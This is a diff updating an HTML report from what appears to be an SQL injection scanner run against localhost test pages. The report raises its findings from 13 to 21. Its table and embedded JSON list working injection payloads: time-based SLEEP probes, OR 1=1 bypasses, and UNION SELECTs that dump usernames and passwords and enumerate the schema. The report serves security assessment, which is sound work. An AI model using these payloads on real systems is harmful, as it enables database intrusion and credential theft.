@@ -292,12 +292,14 @@
             position: sticky;
             top: 0;
             z-index: 10;
+            color: #333 !important;
         }
 
         td {
             padding: 15px;
             border-bottom: 1px solid #e9ecef;
             vertical-align: top;
+            color: #333 !important;
         }
 
         tr:hover {
@@ -446,7 +448,7 @@
         <div class="header">
             <h1><i class="fas fa-shield-alt"></i> SQL Injection Vulnerability Report</h1>
             <div class="subtitle">Security Assessment Results</div>
-            <div class="generated-time">Generated at: 2025-06-12T22:24:20.581258</div>
+            <div class="generated-time">Generated at: 2025-06-23T15:08:57.813975</div>
         </div>
 
         <div class="actions-bar">
@@ -470,49 +472,49 @@
         <div class="content">
             <div class="stats-grid">
                 <div class="stat-card total">
-                    <div class="stat-number">13</div>
+                    <div class="stat-number">21</div>
                     <div class="stat-label">Total Vulnerabilities</div>
                 </div>
-
+                
                 <div class="stat-card critical">
-                    <div class="stat-number">4</div>
+                    <div class="stat-number">6</div>
                     <div class="stat-label">Critical</div>
                 </div>
-
+                
                 <div class="stat-card high">
-                    <div class="stat-number">9</div>
+                    <div class="stat-number">15</div>
                     <div class="stat-label">High</div>
                 </div>
-
+                
             </div>
 
             <div class="severity-chart">
                 <div class="chart-title">
                     <i class="fas fa-chart-pie"></i> Severity Distribution
                 </div>
-
-
+                
+                
                 <div class="severity-bar">
                     <div class="severity-label">
                         <span>Critical</span>
-                        <span>4 (30.8%)</span>
+                        <span>6 (28.6%)</span>
                     </div>
                     <div class="progress-bar">
-                        <div class="progress-fill critical" style="width: 30.8%"></div>
+                        <div class="progress-fill critical" style="width: 28.6%"></div>
                     </div>
                 </div>
-
-
+                
+                
                 <div class="severity-bar">
                     <div class="severity-label">
                         <span>High</span>
-                        <span>9 (69.2%)</span>
+                        <span>15 (71.4%)</span>
                     </div>
                     <div class="progress-bar">
-                        <div class="progress-fill high" style="width: 69.2%"></div>
+                        <div class="progress-fill high" style="width: 71.4%"></div>
                     </div>
                 </div>
-
+                
             </div>
 
             <div class="table-container">
@@ -522,11 +524,11 @@
                     </div>
                     <div class="filter-tabs">
                         <button class="filter-tab active" onclick="filterBySeverity('all')">All</button>
-
+                        
                         <button class="filter-tab" onclick="filterBySeverity('critical')">Critical</button>
-
+                        
                         <button class="filter-tab" onclick="filterBySeverity('high')">High</button>
-
+                        
                     </div>
                 </div>
 
@@ -548,7 +550,7 @@
                             </tr>
                         </thead>
                         <tbody id="vulnerabilityTableBody">
-
+                            
                             <tr data-severity="critical">
                                 <td>1</td>
                                 <td>SQL Injection (UNKNOWN) - Time Based</td>
@@ -559,12 +561,10 @@
                                 </td>
                                 <td><span class="input-field-tag">category</span></td>
                                 <td>
-                                    <div class="url-cell">
-                                        http://localhost:8080/api/v1/products.php?category=%27%20OR%20IF%281%3D1%2C%20SLEEP%285%29%2C%200%29--%20x
-                                    </div>
+                                    <div class="url-cell">http://localhost:8000/api/v1/products.php?category=%27%20OR%20IF%281%3D1%2C%20SLEEP%285%29%2C%200%29--%20x</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="critical">
                                 <td>2</td>
                                 <td>SQL Injection (UNKNOWN) - Time Based</td>
@@ -575,12 +575,10 @@
                                 </td>
                                 <td><span class="input-field-tag">category</span></td>
                                 <td>
-                                    <div class="url-cell">
-                                        http://localhost:8080/api/v1/products.php?category=%27%20OR%20SLEEP%285%29--%20x
-                                    </div>
+                                    <div class="url-cell">http://localhost:8000/api/v1/products.php?category=%27%20OR%20SLEEP%285%29--%20x</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="critical">
                                 <td>3</td>
                                 <td>SQL Injection (UNKNOWN) - Time Based</td>
@@ -589,12 +587,12 @@
                                 <td>
                                     <div class="payload-cell">' OR IF(1=1, SLEEP(5), 0)-- x</div>
                                 </td>
-                                <td><span class="input-field-tag">username</span></td>
+                                <td><span class="input-field-tag">password</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="critical">
                                 <td>4</td>
                                 <td>SQL Injection (UNKNOWN) - Time Based</td>
@@ -603,12 +601,12 @@
                                 <td>
                                     <div class="payload-cell">' OR SLEEP(5)-- x</div>
                                 </td>
-                                <td><span class="input-field-tag">username</span></td>
+                                <td><span class="input-field-tag">password</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
                                 <td>5</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
@@ -617,12 +615,12 @@
                                 <td>
                                     <div class="payload-cell">' OR '1'='1'-- x</div>
                                 </td>
-                                <td><span class="input-field-tag">username</span></td>
+                                <td><span class="input-field-tag">password</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
                                 <td>6</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
@@ -631,14 +629,70 @@
                                 <td>
                                     <div class="payload-cell">' OR 1=1-- x</div>
                                 </td>
-                                <td><span class="input-field-tag">username</span></td>
+                                <td><span class="input-field-tag">password</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
-                            <tr data-severity="high">
+                            
+                            <tr data-severity="critical">
                                 <td>7</td>
+                                <td>SQL Injection (UNKNOWN) - Time Based</td>
+                                <td>Detected SQL injection vulnerability via time delay (>4s).</td>
+                                <td><span class="severity-badge severity-critical">CRITICAL</span></td>
+                                <td>
+                                    <div class="payload-cell">' OR IF(1=1, SLEEP(5), 0)-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="critical">
+                                <td>8</td>
+                                <td>SQL Injection (UNKNOWN) - Time Based</td>
+                                <td>Detected SQL injection vulnerability via time delay (>4s).</td>
+                                <td><span class="severity-badge severity-critical">CRITICAL</span></td>
+                                <td>
+                                    <div class="payload-cell">' OR SLEEP(5)-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="high">
+                                <td>9</td>
+                                <td>SQL Injection (UNKNOWN) - Boolean Based</td>
+                                <td>Detected potential unknown SQL injection via content change/keyword.</td>
+                                <td><span class="severity-badge severity-high">HIGH</span></td>
+                                <td>
+                                    <div class="payload-cell">' OR '1'='1'-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="high">
+                                <td>10</td>
+                                <td>SQL Injection (UNKNOWN) - Boolean Based</td>
+                                <td>Detected potential unknown SQL injection via content change/keyword.</td>
+                                <td><span class="severity-badge severity-high">HIGH</span></td>
+                                <td>
+                                    <div class="payload-cell">' OR 1=1-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="high">
+                                <td>11</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
@@ -647,43 +701,40 @@
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
-                                <td>8</td>
+                                <td>12</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
                                 <td>
-                                    <div class="payload-cell">' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM
-                                        information_schema.columns WHERE table_name='users'-- x # Lấy các cột của bảng
-                                        'users'</div>
+                                    <div class="payload-cell">' UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name='users'-- x # Lấy các cột của bảng 'users'</div>
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
-                                <td>9</td>
+                                <td>13</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
                                 <td>
-                                    <div class="payload-cell">' UNION SELECT GROUP_CONCAT(id,':',username,':',password
-                                        SEPARATOR ';'), NULL, NULL FROM users-- x</div>
+                                    <div class="payload-cell">' UNION SELECT GROUP_CONCAT(id,':',username,':',password SEPARATOR ';'), NULL, NULL FROM users-- x</div>
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
-                                <td>10</td>
+                                <td>14</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
@@ -692,27 +743,26 @@
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
-                                <td>11</td>
+                                <td>15</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
                                 <td>
-                                    <div class="payload-cell">' UNION SELECT column_name, table_name, NULL FROM
-                                        information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0-- x</div>
+                                    <div class="payload-cell">' UNION SELECT column_name, table_name, NULL FROM information_schema.columns WHERE table_name='users' LIMIT 1 OFFSET 0-- x</div>
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
-                                <td>12</td>
+                                <td>16</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
@@ -721,25 +771,80 @@
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
                             <tr data-severity="high">
-                                <td>13</td>
+                                <td>17</td>
                                 <td>SQL Injection (UNKNOWN) - Boolean Based</td>
                                 <td>Detected potential unknown SQL injection via content change/keyword.</td>
                                 <td><span class="severity-badge severity-high">HIGH</span></td>
                                 <td>
-                                    <div class="payload-cell">' UNION SELECT id, username, password FROM users LIMIT 1
-                                        OFFSET 0-- x</div>
+                                    <div class="payload-cell">' UNION SELECT id, username, password FROM users LIMIT 1 OFFSET 0-- x</div>
                                 </td>
                                 <td><span class="input-field-tag">username</span></td>
                                 <td>
-                                    <div class="url-cell">http://localhost:8080/process.php</div>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
                                 </td>
                             </tr>
-
+                            
+                            <tr data-severity="high">
+                                <td>18</td>
+                                <td>SQL Injection (UNKNOWN) - Boolean Based</td>
+                                <td>Detected potential unknown SQL injection via content change/keyword.</td>
+                                <td><span class="severity-badge severity-high">HIGH</span></td>
+                                <td>
+                                    <div class="payload-cell">' UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata LIMIT 1 OFFSET 0-- x # Lấy tên DB đầu tiên</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="high">
+                                <td>19</td>
+                                <td>SQL Injection (UNKNOWN) - Boolean Based</td>
+                                <td>Detected potential unknown SQL injection via content change/keyword.</td>
+                                <td><span class="severity-badge severity-high">HIGH</span></td>
+                                <td>
+                                    <div class="payload-cell">' UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="high">
+                                <td>20</td>
+                                <td>SQL Injection (MYSQL) - Error Based</td>
+                                <td>Detected mysql SQL injection vulnerability via error message.</td>
+                                <td><span class="severity-badge severity-high">HIGH</span></td>
+                                <td>
+                                    <div class="payload-cell">' WAITFOR DELAY '0:0:5'-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
+                            <tr data-severity="high">
+                                <td>21</td>
+                                <td>SQL Injection (MYSQL) - Error Based</td>
+                                <td>Detected mysql SQL injection vulnerability via error message.</td>
+                                <td><span class="severity-badge severity-high">HIGH</span></td>
+                                <td>
+                                    <div class="payload-cell">') ORDER BY 1-- x</div>
+                                </td>
+                                <td><span class="input-field-tag">username</span></td>
+                                <td>
+                                    <div class="url-cell">http://localhost:8000/process.php</div>
+                                </td>
+                            </tr>
+                            
                         </tbody>
                     </table>
                 </div>
@@ -760,8 +865,8 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
     <script>
         // Store original data for filtering
-        const vulnerabilityData = [{ "description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "category", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR IF(1=1, SLEEP(5), 0)-- x", "severity": "critical", "timestamp": "2025-06-12T22:23:32.662437", "url": "http://localhost:8080/api/v1/products.php?category=%27%20OR%20IF%281%3D1%2C%20SLEEP%285%29%2C%200%29--%20x" }, { "description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "category", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR SLEEP(5)-- x", "severity": "critical", "timestamp": "2025-06-12T22:23:47.947746", "url": "http://localhost:8080/api/v1/products.php?category=%27%20OR%20SLEEP%285%29--%20x" }, { "description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR IF(1=1, SLEEP(5), 0)-- x", "severity": "critical", "timestamp": "2025-06-12T22:24:03.769022", "url": "http://localhost:8080/process.php" }, { "description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR SLEEP(5)-- x", "severity": "critical", "timestamp": "2025-06-12T22:24:18.814977", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 OR \u00271\u0027=\u00271\u0027-- x", "severity": "high", "timestamp": "2025-06-12T22:23:48.684771", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 OR 1=1-- x", "severity": "high", "timestamp": "2025-06-12T22:23:48.735028", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT @@version, @@hostname, user() -- x", "severity": "high", "timestamp": "2025-06-12T22:24:19.164908", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name=\u0027users\u0027-- x # L\u1ea5y c\u00e1c c\u1ed9t c\u1ee7a b\u1ea3ng \u0027users\u0027", "severity": "high", "timestamp": "2025-06-12T22:24:19.199647", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT GROUP_CONCAT(id,\u0027:\u0027,username,\u0027:\u0027,password SEPARATOR \u0027;\u0027), NULL, NULL FROM users-- x", "severity": "high", "timestamp": "2025-06-12T22:24:19.231758", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT NULL,NULL,NULL-- x", "severity": "high", "timestamp": "2025-06-12T22:24:19.374338", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT column_name, table_name, NULL FROM information_schema.columns WHERE table_name=\u0027users\u0027 LIMIT 1 OFFSET 0-- x", "severity": "high", "timestamp": "2025-06-12T22:24:19.452378", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT database(), user(), version() -- x", "severity": "high", "timestamp": "2025-06-12T22:24:19.477958", "url": "http://localhost:8080/process.php" }, { "description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT id, username, password FROM users LIMIT 1 OFFSET 0-- x", "severity": "high", "timestamp": "2025-06-12T22:24:19.502631", "url": "http://localhost:8080/process.php" }];
-        const statsData = { "severity_distribution": { "critical": 4, "high": 9 }, "total": 13 };
+        const vulnerabilityData = [{"description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "category", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR IF(1=1, SLEEP(5), 0)-- x", "severity": "critical", "timestamp": "2025-06-23T15:05:40.763282", "url": "http://localhost:8000/api/v1/products.php?category=%27%20OR%20IF%281%3D1%2C%20SLEEP%285%29%2C%200%29--%20x"}, {"description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "category", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR SLEEP(5)-- x", "severity": "critical", "timestamp": "2025-06-23T15:05:55.778174", "url": "http://localhost:8000/api/v1/products.php?category=%27%20OR%20SLEEP%285%29--%20x"}, {"description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "password", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR IF(1=1, SLEEP(5), 0)-- x", "severity": "critical", "timestamp": "2025-06-23T15:08:12.359034", "url": "http://localhost:8000/process.php"}, {"description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "password", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR SLEEP(5)-- x", "severity": "critical", "timestamp": "2025-06-23T15:08:27.371144", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "password", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 OR \u00271\u0027=\u00271\u0027-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.322778", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "password", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 OR 1=1-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.343361", "url": "http://localhost:8000/process.php"}, {"description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR IF(1=1, SLEEP(5), 0)-- x", "severity": "critical", "timestamp": "2025-06-23T15:06:11.674008", "url": "http://localhost:8000/process.php"}, {"description": "Detected SQL injection vulnerability via time delay (\u003e4s).", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Time Based", "payload": "\u0027 OR SLEEP(5)-- x", "severity": "critical", "timestamp": "2025-06-23T15:06:26.685032", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 OR \u00271\u0027=\u00271\u0027-- x", "severity": "high", "timestamp": "2025-06-23T15:05:56.617557", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 OR 1=1-- x", "severity": "high", "timestamp": "2025-06-23T15:05:56.653648", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT @@version, @@hostname, user() -- x", "severity": "high", "timestamp": "2025-06-23T15:07:56.807351", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT GROUP_CONCAT(column_name), NULL, NULL FROM information_schema.columns WHERE table_name=\u0027users\u0027-- x # L\u1ea5y c\u00e1c c\u1ed9t c\u1ee7a b\u1ea3ng \u0027users\u0027", "severity": "high", "timestamp": "2025-06-23T15:07:56.830485", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT GROUP_CONCAT(id,\u0027:\u0027,username,\u0027:\u0027,password SEPARATOR \u0027;\u0027), NULL, NULL FROM users-- x", "severity": "high", "timestamp": "2025-06-23T15:07:56.848820", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT NULL,NULL,NULL-- x", "severity": "high", "timestamp": "2025-06-23T15:07:56.957564", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT column_name, table_name, NULL FROM information_schema.columns WHERE table_name=\u0027users\u0027 LIMIT 1 OFFSET 0-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.019633", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT database(), user(), version() -- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.044542", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT id, username, password FROM users LIMIT 1 OFFSET 0-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.064391", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT schema_name, NULL, NULL FROM information_schema.schemata LIMIT 1 OFFSET 0-- x # L\u1ea5y t\u00ean DB \u0111\u1ea7u ti\u00ean", "severity": "high", "timestamp": "2025-06-23T15:07:57.093410", "url": "http://localhost:8000/process.php"}, {"description": "Detected potential unknown SQL injection via content change/keyword.", "input_field": "username", "name": "SQL Injection (UNKNOWN) - Boolean Based", "payload": "\u0027 UNION SELECT table_name, table_schema, NULL FROM information_schema.tables WHERE table_schema=database() LIMIT 1 OFFSET 0-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.149702", "url": "http://localhost:8000/process.php"}, {"description": "Detected mysql SQL injection vulnerability via error message.", "input_field": "username", "name": "SQL Injection (MYSQL) - Error Based", "payload": "\u0027 WAITFOR DELAY \u00270:0:5\u0027-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.253774", "url": "http://localhost:8000/process.php"}, {"description": "Detected mysql SQL injection vulnerability via error message.", "input_field": "username", "name": "SQL Injection (MYSQL) - Error Based", "payload": "\u0027) ORDER BY 1-- x", "severity": "high", "timestamp": "2025-06-23T15:07:57.268209", "url": "http://localhost:8000/process.php"}];
+        const statsData = {"severity_distribution": {"critical": 6, "high": 15}, "total": 21};
         let filteredData = [...vulnerabilityData];
         let currentFilter = 'all';
 
@@ -839,78 +944,78 @@
                     // Summary sheet
                     const summaryData = [
                         ['SQL Injection Vulnerability Report'],
-                        ['Generated at:', '2025-06-12T22:24:20.581258'],
+                        ['Generated at:', '2025-06-23T15:08:57.813975'],
                         [''],
                         ['Summary Statistics'],
-                        ['Total Vulnerabilities:', 13],
-
-                        ['Critical:', 4],
-
-                        ['High:', 9],
-
-                        [''],
-                        ['Severity Distribution'],
-
-
-                        ['Critical (30.8%)', '4 vulnerabilities'],
-
-
-                        ['High (69.2%)', '9 vulnerabilities'],
-
+                        ['Total Vulnerabilities:', 21],
+                
+                ['Critical:', 6],
+                
+                ['High:', 15],
+                
+        [''],
+            ['Severity Distribution'],
+            
+        
+        ['Critical (28.6%)', '6 vulnerabilities'],
+            
+        
+        ['High (71.4%)', '15 vulnerabilities'],
+            
                     ];
 
-                    const summaryWs = XLSX.utils.aoa_to_sheet(summaryData);
-                    XLSX.utils.book_append_sheet(wb, summaryWs, 'Summary');
+        const summaryWs = XLSX.utils.aoa_to_sheet(summaryData);
+        XLSX.utils.book_append_sheet(wb, summaryWs, 'Summary');
 
-                    // Vulnerabilities sheet
-                    const vulnData = [
-                        ['#', 'Vulnerability Name', 'Description', 'Severity', 'Payload', 'Input Field', 'URL']
-                    ];
+        // Vulnerabilities sheet
+        const vulnData = [
+            ['#', 'Vulnerability Name', 'Description', 'Severity', 'Payload', 'Input Field', 'URL']
+        ];
 
-                    vulnerabilityData.forEach((vuln, index) => {
-                        vulnData.push([
-                            index + 1,
-                            vuln.name,
-                            vuln.description,
-                            vuln.severity.toUpperCase(),
-                            vuln.payload,
-                            vuln.input_field || 'N/A',
-                            vuln.url
-                        ]);
-                    });
+        vulnerabilityData.forEach((vuln, index) => {
+            vulnData.push([
+                index + 1,
+                vuln.name,
+                vuln.description,
+                vuln.severity.toUpperCase(),
+                vuln.payload,
+                vuln.input_field || 'N/A',
+                vuln.url
+            ]);
+        });
 
-                    const vulnWs = XLSX.utils.aoa_to_sheet(vulnData);
+        const vulnWs = XLSX.utils.aoa_to_sheet(vulnData);
 
-                    // Auto-size columns
-                    const colWidths = [
-                        { wch: 5 },   // #
-                        { wch: 40 },  // Name
-                        { wch: 50 },  // Description
-                        { wch: 12 },  // Severity
-                        { wch: 60 },  // Payload
-                        { wch: 15 },  // Input Field
-                        { wch: 80 }   // URL
-                    ];
-                    vulnWs['!cols'] = colWidths;
+        // Auto-size columns
+        const colWidths = [
+            { wch: 5 },   // #
+            { wch: 40 },  // Name
+            { wch: 50 },  // Description
+            { wch: 12 },  // Severity
+            { wch: 60 },  // Payload
+            { wch: 15 },  // Input Field
+            { wch: 80 }   // URL
+        ];
+        vulnWs['!cols'] = colWidths;
 
-                    XLSX.utils.book_append_sheet(wb, vulnWs, 'Vulnerabilities');
+        XLSX.utils.book_append_sheet(wb, vulnWs, 'Vulnerabilities');
 
-                    // Generate filename with timestamp
-                    const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
-                    const filename = `SQL_Injection_Report_${timestamp}.xlsx`;
+        // Generate filename with timestamp
+        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
+        const filename = `SQL_Injection_Report_${timestamp}.xlsx`;
 
-                    // Save file
-                    XLSX.writeFile(wb, filename);
+        // Save file
+        XLSX.writeFile(wb, filename);
 
-                    progressDialog.style.display = 'none';
+        progressDialog.style.display = 'none';
 
-                    // Show success message
-                    alert('Excel file exported successfully!');
-
+        // Show success message
+        alert('Excel file exported successfully!');
+                    
                 } catch (error) {
-                    progressDialog.style.display = 'none';
-                    alert('Error exporting Excel file: ' + error.message);
-                }
+            progressDialog.style.display = 'none';
+            alert('Error exporting Excel file: ' + error.message);
+        }
             }, 1000);
         }
 
@@ -920,13 +1025,13 @@
 
         function generateSummary() {
             let summary = 'Security Assessment Summary:\n\n';
+            
+            summary += '🔴 Critical Vulnerabilities: 6\n';
+            
+            summary += '🟡 High Vulnerabilities: 15\n';
+            
 
-            summary += '🔴 Critical Vulnerabilities: 4\n';
-
-            summary += '🟡 High Vulnerabilities: 9\n';
-
-
-            summary += '\nTotal: 13 vulnerabilities found\n\n';
+            summary += '\nTotal: 21 vulnerabilities found\n\n';
             summary += 'Recommendation:\n';
